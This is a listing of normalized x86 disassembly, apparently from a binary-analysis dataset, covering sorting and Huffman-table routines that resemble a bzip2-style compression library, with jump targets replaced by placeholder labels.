mov ebx [ esi + ebp * 4 ]
test ebx 0x200000
jne r-xdata
mov edx [ esp + ebx + 0x13c ]
mov eax ebx
sub eax ecx
mov [ esp + 0x20 ] edx
lea edi [ edx + 0x1 ]
mov [ esp + 0x1c ] eax
shl edi 0xa
mov eax ebx
mov ebp [ esp + 0x18 ]
mov edi [ edi + esi ]
sub eax ecx
shl edx 0xa
sub edi [ edx + esi ]
mov edx [ esp + eax + 0x13c ]
mov eax [ esp + eax + 0x13c ]
inc edx
shl edx 0xa
shl eax 0xa
mov edx [ edx + esi ]
sub edx [ eax + esi ]
cmp edx edi
jbe r-xdata
mov edx [ esp + 0x14 ]
mov ebp [ esp + 0xd44 ]
mov edx eax
sub edx ecx
mov [ esp + 0x1c ] edx
mov edx eax
sub edx ecx
mov ebx [ esp + edx + 0x13c ]
mov edx [ esp + edx + 0x13c ]
inc ebx
shl ebx 0xa
shl edx 0xa
mov ebx [ ebx + esi ]
sub ebx [ edx + esi ]
cmp ebx edi
mov ebx [ esp + 0x10 ]
ja r-xdata
cmp eax edx
je r-xdata
mov cl [ esp + edx + 0x3c ]
lea eax [ esp + edx + 0x3c ]
test cl cl
mov [ esp + 0x38 ] eax
je r-xdata
mov ecx [ esi + ebp * 4 ]
or ecx 0x200000
mov [ esi + ebp * 4 ] ecx
mov ebp [ esp + 0xd44 ]
mov edi [ esi + ebp * 4 + 0x4 ]
and ebx 0xffdfffff
and edi 0xffdfffff
dec edi
cmp edi ebx
jle r-xdata
mov edx eax
sub edx ecx
mov edx [ esp + edx + 0x13c ]
mov [ esp + eax + 0x13c ] edx
mov edx [ esp + 0x14 ]
sub ebp edx
sub eax ecx
dec edx
cmp ebp edx
jle r-xdata
lea ecx [ esi + edx * 4 ]
xor eax eax
mov [ esp + 0x30 ] ecx
push 0x3ee
call sub_402720
mov edx [ esp + 0x18 ]
add esp 0x4
mov eax [ esp + 0xd58 ]
mov ecx [ esp + 0xd50 ]
mov edx [ esp + 0xd48 ]
push eax
mov eax [ esp + 0xd48 ]
push 0x2
push edi
push ebx
push ecx
mov ecx [ esp + 0xd54 ]
push edx
push eax
push ecx
call sub_414310
mov edx [ esp + 0x4c ]
mov ecx [ esp + 0xd78 ]
sub edi ebx
add esp 0x20
lea eax [ edx + edi + 0x1 ]
mov [ esp + 0x2c ] eax
mov eax [ ecx ]
test eax eax
jl r-xdata
mov edi [ ecx ]
add eax 0x4
and edi 0xffdfffff
add ecx 0x400
mov [ esp + eax + 0x538 ] edi
mov edi [ ecx - 0x3fc ]
and edi 0xffdfffff
dec edi
cmp eax 0x3fc
mov [ esp + eax + 0x938 ] edi
jle r-xdata
shl edx 0xa
mov ebx [ esp + 0xd40 ]
lea eax [ edx + esi ]
mov [ esp + 0x34 ] eax
mov edx [ eax ]
mov eax [ esp + 0x14 ]
and edx 0xffdfffff
mov edi [ esp + eax * 4 + 0x53c ]
lea ecx [ esp + eax * 4 + 0x53c ]
cmp edx edi
mov [ esp + 0x20 ] ecx
jge r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0xd2c
retn
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
lea edx [ eax + 0x1 ]
shl edx 0xa
mov edi [ edx + esi ]
lea ecx [ edx + esi ]
lea edx [ esp + eax * 4 + 0x93c ]
and edi 0xffdfffff
dec edi
mov [ esp + 0x1c ] ecx
mov eax [ edx ]
mov [ esp + 0x14 ] edx
cmp edi eax
jle r-xdata
lea eax [ ebx + edx * 4 ]
mov [ esp + 0x10 ] eax
mov ecx [ esp + 0x20 ]
mov edx [ edx ]
mov eax [ ecx ]
lea ecx [ eax - 0x1 ]
cmp ecx edx
je r-xdata
lea eax [ ebx + edi * 4 ]
mov [ esp + 0x10 ] eax
mov al [ ecx + ebp ]
mov [ esp + 0x24 ] al
mov eax [ esp + 0x24 ]
and eax 0xff
cmp [ esp + eax + 0x3c ] 0x0
jne r-xdata
add ecx [ esp + 0xd50 ]
mov eax [ esp + 0x30 ]
mov ecx 0x100
test eax eax
jne r-xdata
mov al [ ecx + ebp ]
mov [ esp + 0x24 ] al
mov eax [ esp + 0x24 ]
and eax 0xff
cmp [ esp + eax + 0x3c ] 0x0
jne r-xdata
add ecx [ esp + 0xd50 ]
mov ecx [ esp + 0x10 ]
inc edx
add ecx 0x4
mov [ esp + 0x10 ] ecx
mov ecx [ esp + 0x20 ]
cmp edx [ ecx ]
jl r-xdata
mov edi [ esp + eax * 4 + 0x53c ]
lea eax [ esp + eax * 4 + 0x53c ]
mov [ ebx + edi * 4 ] ecx
inc edi
mov [ eax ] edi
mov edx [ eax ]
add eax 0x400
or edx 0x200000
dec ecx
mov [ eax - 0x400 ] edx
jne r-xdata
mov ecx [ esp + 0x38 ]
mov eax [ esp + 0x18 ]
cmp eax 0xff
mov [ ecx ] 0x1
jge r-xdata
push 0x3ef
call sub_402720
add esp 0x4
mov eax [ esp + 0xd50 ]
dec eax
cmp edx eax
je r-xdata
mov ecx [ esp + 0x10 ]
mov eax [ edx ]
dec edi
sub ecx 0x4
cmp edi eax
mov [ esp + 0x10 ] ecx
jg r-xdata
mov edx [ esp + eax * 4 + 0x93c ]
lea eax [ esp + eax * 4 + 0x93c ]
mov [ ebx + edx * 4 ] ecx
dec edx
mov [ eax ] edx
mov edx [ esp + 0x14 ]
mov ecx [ esp + 0x10 ]
mov ecx [ ecx ]
dec ecx
jns r-xdata
mov eax [ esp + 0x14 ]
mov eax [ esp + 0x18 ]
mov edx [ esp + 0x28 ]
inc eax
add edx 0x4
cmp eax 0xff
mov [ esp + 0x18 ] eax
mov [ esp + 0x28 ] edx
jle r-xdata
mov edx [ esp + 0x34 ]
mov eax [ esp + 0x1c ]
xor ecx ecx
mov edx [ edx ]
mov eax [ eax ]
and edx 0xffdfffff
and eax 0xffdfffff
sub eax edx
cmp eax 0xfffe
jle r-xdata
mov ecx [ esp + 0x10 ]
mov ecx [ ecx ]
dec ecx
jns r-xdata
mov edx [ esp + 0x28 ]
xor eax eax
mov [ esp + 0x10 ] eax
mov edx [ edx ]
mov [ esp + 0x14 ] edx
dec eax
mov edi eax
mov [ esp + 0x1c ] eax
test edi edi
jl r-xdata
inc ecx
mov edi eax
sar edi cl
cmp edi 0xfffe
jg r-xdata
sar eax cl
cmp eax 0xffff
jle r-xdata
add edx edi
lea edx [ ebx + edx * 4 ]
mov [ esp + 0x10 ] edx
mov ebx [ esp + 0xd40 ]
push 0x3ea
call sub_402720
add esp 0x4
mov edx [ esp + 0x10 ]
dec edi
sub edx 0x4
test edi edi
mov [ esp + 0x10 ] edx
jge r-xdata
mov ebx [ esp + 0xd50 ]
add edx ebx
mov ebx [ esp + 0xd48 ]
mov [ ebx + edx * 2 ] ax
mov eax [ esp + 0x10 ]
mov ebx [ esp + 0xd48 ]
mov edx [ eax ]
mov eax edi
sar eax cl
cmp edx 0x22
mov [ ebx + edx * 2 ] ax
jge r-xdata
mov eax [ esp + 0x1c ]
sub_414310
sub esp 0x504
mov eax [ esp + 0x518 ]
mov ecx [ esp + 0x51c ]
mov edx [ esp + 0x520 ]
push ebx
mov ebx [ esp + 0x50c ]
push ebp
mov [ esp + 0x37c ] eax
push esi
lea eax [ esp + 0x64 ]
push edi
mov [ esp + 0x1f4 ] ecx
mov [ esp + 0x64 ] edx
mov ebp 0x1
mov [ esp + 0x1c ] eax
lea esi [ esp + 0x1f8 ]
lea edi [ esp + 0x388 ]
jmp r-xdata
cmp ebp 0x64
jl r-xdata
mov edx [ esp + 0x1c ]
dec ebp
sub edi 0x4
sub esi 0x4
mov [ esp + 0x24 ] ebp
mov [ esp + 0x2c ] edi
mov ebp [ edi ]
mov edi [ esi ]
sub edx 0x4
mov [ esp + 0x18 ] esi
mov [ esp + 0x1c ] edx
mov ecx edx
mov edx edi
mov [ esp + 0x30 ] ebp
mov esi [ ecx ]
sub edx ebp
cmp edx 0x14
jl r-xdata
push 0x3e9
call sub_402720
add esp 0x4
mov edx [ esp + 0x534 ]
mov eax [ esp + 0x524 ]
mov ecx [ esp + 0x520 ]
push edx
mov edx [ esp + 0x520 ]
push esi
push edi
push ebp
push eax
push ecx
push edx
push ebx
call sub_414750
mov eax [ esp + 0x554 ]
add esp 0x20
cmp [ eax ] 0x0
jl r-xdata
cmp esi 0xe
jg r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x504
retn
mov eax [ esp + 0x24 ]
test eax eax
jg r-xdata
lea ecx [ edi + ebp ]
lea eax [ ebx + ebp * 4 ]
sar ecx 0x1
mov [ esp + 0x60 ] eax
mov edx [ ebx + ecx * 4 ]
mov ecx [ esp + 0x51c ]
add edx esi
mov dl [ edx + ecx ]
push edx
mov edx [ ebx + edi * 4 ]
add edx esi
mov dl [ edx + ecx ]
add ecx esi
push edx
mov edx [ eax ]
mov al [ ecx + edx ]
push eax
call sub_414d00
add esp 0xc
and eax 0xff
mov [ esp + 0x28 ] eax
mov [ esp + 0x34 ] ebp
mov [ esp + 0x10 ] ebp
mov [ esp + 0x20 ] edi
mov edi [ esp + 0x2c ]
mov esi [ esp + 0x18 ]
mov ebp [ esp + 0x24 ]
mov ebp [ esp + 0x34 ]
mov eax [ esp + 0x20 ]
cmp eax ebp
jge r-xdata
mov ecx [ eax ]
mov ebp [ esp + 0x51c ]
mov [ esp + 0x5c ] ecx
add ecx esi
xor edx edx
mov dl [ ecx + ebp ]
mov ecx edx
mov edx [ esp + 0x28 ]
sub ecx edx
jne r-xdata
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x30 ]
mov edx ecx
sub edx ebp
sub ebp eax
cmp ebp edx
mov [ esp + 0x14 ] edx
jl r-xdata
mov eax [ esp + 0x1c ]
mov ebp [ esp + 0x24 ]
mov edi [ esp + 0x2c ]
inc esi
mov [ eax ] esi
mov esi [ esp + 0x18 ]
mov ecx 0x4
inc ebp
add edi ecx
add esi ecx
add eax ecx
mov [ esp + 0x24 ] ebp
mov [ esp + 0x2c ] edi
mov [ esp + 0x18 ] esi
mov [ esp + 0x1c ] eax
jmp r-xdata
test ecx ecx
jg r-xdata
mov ecx [ esp + 0x14 ]
mov edx [ ecx ]
add ecx 0x4
mov [ eax ] edx
mov edx [ esp + 0x5c ]
mov [ ecx - 0x4 ] edx
mov edx [ esp + 0x34 ]
inc edx
mov [ esp + 0x14 ] ecx
mov [ esp + 0x34 ] edx
mov edx [ esp + 0x10 ]
inc edx
add eax 0x4
mov [ esp + 0x10 ] edx
jmp r-xdata
test ebp ebp
jle r-xdata
mov ebp edx
mov eax [ esp + 0x20 ]
lea ecx [ ebx + eax * 4 ]
lea eax [ ebx + edi * 4 ]
mov [ esp + 0x14 ] ecx
mov edx [ esp + 0x10 ]
inc edx
add eax 0x4
mov [ esp + 0x10 ] edx
jmp r-xdata
cmp [ esp + 0x10 ] edi
jg r-xdata
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x20 ]
sub eax edi
mov ebp [ ecx ]
mov ecx ebp
sub ecx [ esp + 0x20 ]
cmp ecx eax
jl r-xdata
mov eax [ esp + 0x60 ]
sub ecx ebp
mov [ esp + 0x28 ] ebp
lea ecx [ ebx + ecx * 4 ]
mov edx [ eax ]
xor ebx ebx
lea ecx [ edx + esi ]
mov bl [ ecx + ebp ]
mov ecx ebx
mov ebx [ esp + 0x28 ]
sub ecx ebx
jne r-xdata
test ecx ecx
jle r-xdata
mov ecx eax
mov edx [ ecx ]
mov ebp [ eax ]
mov [ eax ] edx
mov edx [ esp + 0x28 ]
mov [ ecx ] ebp
add eax 0x4
add ecx 0x4
dec edx
mov [ esp + 0x28 ] edx
jne r-xdata
mov edx [ esp + 0x14 ]
test ecx ecx
jl r-xdata
mov ecx [ esp + 0x14 ]
mov ebx [ ecx ]
sub ecx 0x4
mov [ eax ] ebx
mov ebx [ esp + 0x518 ]
mov [ ecx + 0x4 ] edx
mov edx [ esp + 0x20 ]
dec edx
dec edi
mov [ esp + 0x20 ] edx
mov [ esp + 0x14 ] ecx
sub eax 0x4
jmp r-xdata
mov eax [ esp + 0x18 ]
mov ebx [ esp + 0x30 ]
mov ebp [ esp + 0x20 ]
mov [ esp + 0x38 ] ebx
mov ecx [ eax ]
sub edi ebp
lea edx [ edx + ebx - 0x1 ]
mov ebp [ esp + 0x30 ]
lea eax [ edi + ecx + 0x1 ]
mov ebx edx
lea edi [ edx + 0x1 ]
sub ebx ebp
mov [ esp + 0x40 ] edi
lea edi [ eax - 0x1 ]
mov [ esp + 0x58 ] edi
lea edi [ esi + 0x1 ]
mov [ esp + 0x4c ] edi
mov edi ecx
sub edi eax
mov [ esp + 0x50 ] edx
cmp ebx edi
mov [ esp + 0x44 ] esi
mov [ esp + 0x48 ] esi
jge r-xdata
mov edx [ esp + 0x10 ]
sub ebp ecx
lea eax [ ebx + edx * 4 ]
lea ebx [ ebx + ebp * 4 + 0x4 ]
mov ebp ecx
mov eax [ esp + 0x10 ]
mov ebx [ esp + 0x518 ]
cmp eax edi
jg r-xdata
mov ebx [ esp + 0x518 ]
dec edi
sub eax 0x4
jmp r-xdata
cmp [ esp + 0x10 ] edi
jg r-xdata
mov edi [ esp + 0x50 ]
mov edx [ esp + 0x48 ]
mov ecx [ esp + 0x18 ]
mov [ esp + 0x38 ] eax
mov eax ebp
mov [ esp + 0x44 ] esi
mov edi [ ecx ]
mov ecx edx
mov edx esi
jmp r-xdata
mov edx [ ebx ]
mov ecx [ eax ]
mov [ eax ] edx
mov [ ebx ] ecx
add eax 0x4
add ebx 0x4
dec ebp
jne r-xdata
mov edx [ esp + 0x14 ]
mov edx [ ebx + edi * 4 ]
mov ecx [ ebx + eax * 4 ]
mov [ ebx + eax * 4 ] edx
inc eax
mov [ ebx + edi * 4 ] ecx
mov [ esp + 0x10 ] eax
dec edi
jmp r-xdata
mov ebp edi
mov ebx ecx
sub ebp [ esp + 0x38 ]
sub ebx eax
cmp ebp ebx
jge r-xdata
mov edx eax
mov eax [ esp + 0x40 ]
mov [ esp + 0x40 ] edx
mov edx ecx
mov ecx [ esp + 0x58 ]
mov [ esp + 0x58 ] edx
mov edx [ esp + 0x4c ]
mov [ esp + 0x4c ] esi
mov ebx [ esp + 0x58 ]
mov ebp [ esp + 0x40 ]
sub ebx ebp
mov ebp ecx
sub ebp eax
cmp ebp ebx
jge r-xdata
mov ecx [ esp + 0x34 ]
mov eax [ esp + 0x10 ]
lea edx [ ebx + ecx * 4 ]
lea eax [ ebx + eax * 4 ]
mov [ esp + 0x14 ] edx
mov ebx [ esp + 0x38 ]
mov ebp [ esp + 0x44 ]
mov ebp [ esp + 0x38 ]
mov ebx eax
mov eax ebp
mov ebp edi
mov edi ecx
mov ecx ebp
mov ebp edx
mov edx esi
jmp r-xdata
mov esi [ esp + 0x2c ]
mov [ esi ] ebx
mov ebx [ esp + 0x18 ]
add esi 0x4
mov [ ebx ] edi
mov edi [ esp + 0x1c ]
add ebx 0x4
mov [ esi ] eax
mov eax [ esp + 0x58 ]
mov [ edi ] ebp
mov ebp [ esp + 0x24 ]
add edi 0x4
mov [ ebx ] ecx
mov ecx [ esp + 0x4c ]
inc ebp
mov [ edi ] edx
mov edx [ esp + 0x40 ]
add esi 0x4
add ebx 0x4
add edi 0x4
inc ebp
mov [ esi ] edx
mov [ ebx ] eax
mov [ edi ] ecx
inc ebp
add esi 0x4
add ebx 0x4
add edi 0x4
mov [ esp + 0x18 ] ebx
mov ebx [ esp + 0x518 ]
mov [ esp + 0x24 ] ebp
mov [ esp + 0x2c ] esi
mov [ esp + 0x1c ] edi
jmp r-xdata
sub_414750
mov eax [ esp + 0x18 ]
sub esp 0x18
push ebx
push ebp
push esi
mov esi [ esp + 0x38 ]
sub eax esi
push edi
inc eax
cmp eax 0x2
jl r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x18
retn
mov ecx [ rw-data ]
xor edx edx
cmp ecx eax
jge r-xdata
dec edx
mov [ esp + 0x1c ] edx
js r-xdata
mov ecx rw-data
mov ebp [ esp + 0x48 ]
mov ebx [ esp + 0x44 ]
mov esi [ esp + 0x2c ]
lea edx [ edx * 4 + rw-data ]
mov [ esp + 0x20 ] edx
mov esi [ ecx + 0x4 ]
add ecx 0x4
inc edx
cmp esi eax
jl r-xdata
mov eax [ esp + 0x1c ]
mov edx [ esp + 0x20 ]
dec eax
sub edx 0x4
test eax eax
mov [ esp + 0x1c ] eax
mov [ esp + 0x20 ] edx
jge r-xdata
mov edx [ eax + esi ]
mov [ esp + 0x48 ] ecx
mov [ esp + 0x2c ] edx
push ebp
lea ecx [ edx + ebx ]
mov edx [ esp + 0x3c ]
push edx
mov edx [ esp + 0x3c ]
sub eax edi
push edx
mov edx [ esp + 0x3c ]
mov eax [ eax + esi ]
push edx
add eax ebx
push ecx
push eax
call sub_414a40
add esp 0x18
test al al
je r-xdata
mov edx [ edx ]
mov eax [ esp + 0x3c ]
mov [ esp + 0x14 ] edx
lea ecx [ edx + eax ]
lea edi [ edx * 4 ]
mov [ esp + 0x18 ] ecx
mov [ esp + 0x10 ] ecx
lea eax [ ecx * 4 ]
mov [ esp + 0x44 ] eax
mov ecx [ esp + 0x48 ]
mov eax [ esp + 0x44 ]
jmp r-xdata
mov ecx [ edx + esi ]
mov [ esp + 0x48 ] eax
mov eax edx
mov edx [ esp + 0x38 ]
push ebp
push edx
mov edx [ esp + 0x3c ]
sub eax edi
push edx
mov edx [ esp + 0x3c ]
mov eax [ eax + esi ]
mov [ esp + 0x38 ] ecx
add ecx ebx
push edx
add eax ebx
push ecx
push eax
call sub_414a40
add esp 0x18
test al al
je r-xdata
mov ecx eax
mov edx [ esp + 0x14 ]
sub ecx edi
mov ecx [ ecx + esi ]
mov [ eax + esi ] ecx
mov ecx [ esp + 0x48 ]
sub ecx edx
mov edx [ esp + 0x18 ]
sub eax edi
dec edx
cmp ecx edx
mov [ esp + 0x48 ] ecx
mov [ esp + 0x24 ] eax
jle r-xdata
mov ecx [ esp + 0x48 ]
mov eax [ esp + 0x44 ]
jmp r-xdata
mov edx [ esp + 0x2c ]
mov eax [ esp + 0x10 ]
mov [ esi + ecx * 4 ] edx
mov edx [ esp + 0x44 ]
mov ecx [ esp + 0x40 ]
inc eax
add edx 0x4
cmp eax ecx
mov [ esp + 0x10 ] eax
mov [ esp + 0x44 ] edx
jg r-xdata
mov ecx [ esp + 0x38 ]
mov edx [ esp + 0x34 ]
push ebp
push ecx
mov ecx [ esp + 0x38 ]
sub eax edi
push edx
mov edx [ esp + 0x38 ]
mov eax [ eax + esi ]
push ecx
lea ecx [ edx + ebx ]
add eax ebx
push ecx
push eax
call sub_414a40
add esp 0x18
test al al
jne r-xdata
mov eax [ edx + esi ]
mov [ esp + 0x48 ] ecx
mov [ esp + 0x2c ] eax
push ebp
lea ecx [ eax + ebx ]
mov eax edx
mov edx [ esp + 0x3c ]
sub eax edi
push edx
mov edx [ esp + 0x3c ]
mov eax [ eax + esi ]
push edx
mov edx [ esp + 0x3c ]
add eax ebx
push edx
push ecx
push eax
call sub_414a40
add esp 0x18
test al al
je r-xdata
mov ecx eax
mov edx [ esp + 0x14 ]
sub ecx edi
mov ecx [ ecx + esi ]
mov [ eax + esi ] ecx
mov ecx [ esp + 0x48 ]
sub ecx edx
mov edx [ esp + 0x18 ]
sub eax edi
dec edx
cmp ecx edx
mov [ esp + 0x48 ] ecx
mov [ esp + 0x24 ] eax
jle r-xdata
mov eax [ esp + 0x24 ]
mov ecx [ esp + 0x48 ]
mov eax [ esp + 0x44 ]
jmp r-xdata
mov edx [ esp + 0x2c ]
mov eax [ esp + 0x40 ]
mov [ esi + ecx * 4 ] edx
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x44 ]
inc ecx
add edx 0x4
cmp ecx eax
mov [ esp + 0x10 ] ecx
mov [ esp + 0x44 ] edx
jg r-xdata
mov ecx [ esp + 0x38 ]
mov edx [ esp + 0x34 ]
push ebp
push ecx
mov ecx [ esp + 0x38 ]
sub eax edi
push edx
mov edx [ esp + 0x38 ]
mov eax [ eax + esi ]
push ecx
lea ecx [ edx + ebx ]
add eax ebx
push ecx
push eax
call sub_414a40
add esp 0x18
test al al
jne r-xdata
mov eax [ esp + 0x44 ]
mov ecx edx
jmp r-xdata
mov ecx eax
mov edx [ esp + 0x14 ]
sub ecx edi
mov ecx [ ecx + esi ]
mov [ eax + esi ] ecx
mov ecx [ esp + 0x48 ]
sub ecx edx
mov edx [ esp + 0x18 ]
sub eax edi
dec edx
cmp ecx edx
mov [ esp + 0x48 ] ecx
mov [ esp + 0x24 ] eax
jle r-xdata
mov eax [ esp + 0x24 ]
cmp ecx [ esp + 0x40 ]
jg r-xdata
mov edx [ esp + 0x2c ]
mov [ esi + ecx * 4 ] edx
mov edx [ esp + 0x10 ]
mov ecx [ esp + 0x44 ]
mov eax [ ebp ]
inc edx
add ecx 0x4
test eax eax
mov [ esp + 0x10 ] edx
mov [ esp + 0x44 ] ecx
jl r-xdata
mov ecx [ esp + 0x38 ]
mov edx [ esp + 0x34 ]
push ebp
push ecx
mov ecx [ esp + 0x38 ]
sub eax edi
push edx
mov edx [ esp + 0x38 ]
mov eax [ eax + esi ]
push ecx
lea ecx [ edx + ebx ]
add eax ebx
push ecx
push eax
call sub_414a40
add esp 0x18
test al al
jne r-xdata
mov eax [ esp + 0x24 ]
sub_414a40
mov eax [ esp + 0x4 ]
push ebx
push ebp
push esi
mov esi [ esp + 0x14 ]
push edi
mov edi [ esp + 0x1c ]
mov cl [ eax + edi ]
mov dl [ esi + edi ]
cmp dl cl
je r-xdata
mov cl [ eax + edi + 0x1 ]
mov dl [ esi + edi + 0x1 ]
inc eax
inc esi
cmp dl cl
je r-xdata
pop edi
pop esi
sbb eax eax
pop ebp
neg eax
pop ebx
retn
mov cl [ eax + edi + 0x1 ]
mov dl [ esi + edi + 0x1 ]
inc eax
inc esi
cmp dl cl
je r-xdata
pop edi
pop esi
sbb eax eax
pop ebp
neg eax
pop ebx
retn
mov cl [ eax + edi + 0x1 ]
mov dl [ esi + edi + 0x1 ]
inc eax
inc esi
cmp dl cl
je r-xdata
pop edi
pop esi
sbb eax eax
pop ebp
neg eax
pop ebx
retn
mov cl [ eax + edi + 0x1 ]
mov dl [ esi + edi + 0x1 ]
inc eax
inc esi
cmp dl cl
je r-xdata
pop edi
pop esi
sbb eax eax
pop ebp
neg eax
pop ebx
retn
mov cl [ eax + edi + 0x1 ]
mov dl [ esi + edi + 0x1 ]
inc eax
inc esi
cmp dl cl
je r-xdata
pop edi
pop esi
sbb eax eax
pop ebp
neg eax
pop ebx
retn
mov cl [ eax + edi + 0x1 ]
mov dl [ esi + edi + 0x1 ]
inc eax
inc esi
cmp dl cl
je r-xdata
pop edi
pop esi
sbb eax eax
pop ebp
neg eax
pop ebx
retn
mov cl [ eax + edi + 0x1 ]
mov dl [ esi + edi + 0x1 ]
inc eax
inc esi
cmp dl cl
je r-xdata
pop edi
pop esi
sbb eax eax
pop ebp
neg eax
pop ebx
retn
mov cl [ eax + edi + 0x1 ]
mov dl [ esi + edi + 0x1 ]
inc eax
inc esi
cmp dl cl
je r-xdata
pop edi
pop esi
sbb eax eax
pop ebp
neg eax
pop ebx
retn
mov cl [ eax + edi + 0x1 ]
mov dl [ esi + edi + 0x1 ]
inc eax
inc esi
cmp dl cl
je r-xdata
pop edi
pop esi
sbb eax eax
pop ebp
neg eax
pop ebx
retn
mov cl [ eax + edi + 0x1 ]
mov dl [ esi + edi + 0x1 ]
inc eax
inc esi
cmp dl cl
je r-xdata
pop edi
pop esi
sbb eax eax
pop ebp
neg eax
pop ebx
retn
mov cl [ eax + edi + 0x1 ]
mov dl [ esi + edi + 0x1 ]
inc eax
inc esi
cmp dl cl
je r-xdata
pop edi
pop esi
sbb eax eax
pop ebp
neg eax
pop ebx
retn
mov ecx [ esp + 0x24 ]
mov dl [ eax + edi + 0x1 ]
mov bl [ esi + edi + 0x1 ]
inc eax
inc esi
add ecx 0x8
cmp bl dl
mov [ esp + 0x14 ] ecx
jne r-xdata
pop edi
pop esi
sbb eax eax
pop ebp
neg eax
pop ebx
retn
pop edi
pop esi
sbb eax eax
pop ebp
neg eax
pop ebx
retn
mov ecx [ esp + 0x20 ]
lea ebp [ ecx + esi * 2 ]
lea ecx [ ecx + eax * 2 ]
mov dl [ eax + edi + 0x1 ]
mov bl [ esi + edi + 0x1 ]
inc eax
add ecx 0x2
inc esi
add ebp 0x2
cmp bl dl
jne r-xdata
mov dx [ ecx ]
mov bx [ ebp ]
cmp bx dx
jne r-xdata
mov dl [ eax + edi + 0x1 ]
mov bl [ esi + edi + 0x1 ]
inc eax
add ecx 0x2
inc esi
add ebp 0x2
cmp bl dl
jne r-xdata
mov dx [ ecx ]
mov bx [ ebp ]
cmp bx dx
jne r-xdata
mov dl [ eax + edi + 0x1 ]
mov bl [ esi + edi + 0x1 ]
inc eax
add ecx 0x2
inc esi
add ebp 0x2
cmp bl dl
jne r-xdata
mov dx [ ecx ]
mov bx [ ebp ]
cmp bx dx
jne r-xdata
mov dl [ eax + edi + 0x1 ]
mov bl [ esi + edi + 0x1 ]
inc eax
add ecx 0x2
inc esi
add ebp 0x2
cmp bl dl
jne r-xdata
mov dx [ ecx ]
mov bx [ ebp ]
cmp bx dx
jne r-xdata
mov dl [ eax + edi + 0x1 ]
mov bl [ esi + edi + 0x1 ]
inc eax
add ecx 0x2
inc esi
add ebp 0x2
cmp bl dl
jne r-xdata
mov dx [ ecx ]
mov bx [ ebp ]
cmp bx dx
jne r-xdata
mov dl [ eax + edi + 0x1 ]
mov bl [ esi + edi + 0x1 ]
inc eax
add ecx 0x2
inc esi
add ebp 0x2
cmp bl dl
jne r-xdata
mov dx [ ecx ]
mov bx [ ebp ]
cmp bx dx
jne r-xdata
mov dl [ eax + edi + 0x1 ]
mov bl [ esi + edi + 0x1 ]
inc eax
add ecx 0x2
inc esi
add ebp 0x2
cmp bl dl
jne r-xdata
mov dx [ ecx ]
mov bx [ ebp ]
cmp bx dx
jne r-xdata
mov edx [ esp + 0x24 ]
inc eax
add ecx 0x2
inc esi
add ebp 0x2
cmp eax edx
jb r-xdata
cmp esi edx
jb r-xdata
lea ebx [ edx + edx ]
sub eax edx
sub ecx ebx
mov edx [ esp + 0x14 ]
mov ebx [ esp + 0x28 ]
sub edx 0x8
dec [ ebx ]
mov [ esp + 0x14 ] edx
test edx edx
jl r-xdata
sub esi edx
add edx edx
sub ebp edx
pop edi
pop esi
pop ebp
xor al al
pop ebx
retn
mov dl [ eax + edi ]
mov bl [ esi + edi ]
cmp bl dl
je r-xdata
mov dx [ ecx ]
mov bx [ ebp ]
cmp bx dx
jne r-xdata
sub_414d00
mov al [ esp + 0x4 ]
mov cl [ esp + 0x8 ]
cmp al cl
jbe r-xdata
mov dl [ esp + 0xc ]
cmp cl dl
jbe r-xdata
mov dl al
mov al cl
mov cl dl
mov al cl
cmp al dl
ja r-xdata
retn
mov al dl
retn
sub_414d30
mov eax 0x143c
call sub_40ad70
mov ecx [ esp + 0x1448 ]
push ebx
push ebp
xor ebp ebp
push esi
cmp ecx ebp
push edi
jle r-xdata
mov [ esp + 0x1c ] ebp
mov [ esp + 0x42c ] ebp
mov ebp 0x1
xor esi esi
cmp ecx ebp
mov ebx ecx
mov [ esp + 0xc3c ] 0xfffffffe
jl r-xdata
mov edx [ esp + 0x1454 ]
lea esi [ esp + 0x430 ]
sub esi edx
mov edi ecx
cmp ebx 0x204
jl r-xdata
or eax 0xffffffff
lea edi [ esp + 0xc40 ]
lea edx [ esp + 0x1c ]
mov [ esp + 0x10 ] esi
[ edi ]
jmp r-xdata
shl eax 0x8
mov [ esi + edx ] eax
add edx 0x4
dec edi
jne r-xdata
mov eax 0x1
mov esi 0x1
xor bl bl
cmp ecx esi
jl r-xdata
push 0x7d2
call sub_402720
mov ecx [ esp + 0x145c ]
add esp 0x4
mov edi [ esp + 0x10 ]
inc esi
mov ecx esi
add edx 0x4
mov edi [ esp + edi + 0x430 ]
mov [ esp + 0x14 ] edx
sar ecx 0x1
mov [ edx ] ebp
mov eax esi
mov edx [ esp + ecx * 4 + 0x1c ]
cmp edi [ esp + edx * 4 + 0x42c ]
jge r-xdata
mov eax [ edx ]
cmp eax ebp
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x143c
retn
lea edi [ esp + 0xc40 ]
mov ecx [ esp + 0x10 ]
mov [ esp + eax * 4 + 0x1c ] ebp
mov eax [ esp + 0x1458 ]
inc ebp
add ecx 0x4
cmp ebp eax
mov [ esp + 0x10 ] ecx
jle r-xdata
mov [ esp + eax * 4 + 0x1c ] edx
mov eax ecx
sar ecx 0x1
mov edx [ esp + ecx * 4 + 0x1c ]
cmp edi [ esp + edx * 4 + 0x42c ]
jl r-xdata
mov eax [ esp + 0x1450 ]
mov [ esi + eax - 0x1 ] dl
mov eax [ esp + 0x145c ]
cmp edx eax
jle r-xdata
mov eax [ esp + eax * 4 + 0xc3c ]
inc edx
test eax eax
jge r-xdata
mov edx [ esp + 0x14 ]
cmp esi 0x104
jl r-xdata
inc esi
add edi 0x4
cmp esi ecx
jle r-xdata
mov bl 0x1
cmp esi 0x1
jle r-xdata
push 0x7d1
call sub_402720
add esp 0x4
mov eax [ edi ]
xor edx edx
test eax eax
jl r-xdata
test bl bl
je r-xdata
mov ecx [ esp + 0x1458 ]
lea ebp [ esp + esi * 4 + 0x1c ]
lea esi [ esp + 0x430 ]
mov eax [ esp + 0x10 ]
dec esi
mov [ esp + ecx * 4 + 0x1c ] eax
mov ecx [ esp + 0x20 ]
mov eax [ ebp ]
mov [ esp + 0x14 ] ecx
mov [ esp + 0x20 ] eax
sub ebp 0x4
mov ecx 0x1
mov [ esp + 0x10 ] eax
jge r-xdata
mov eax [ esi ]
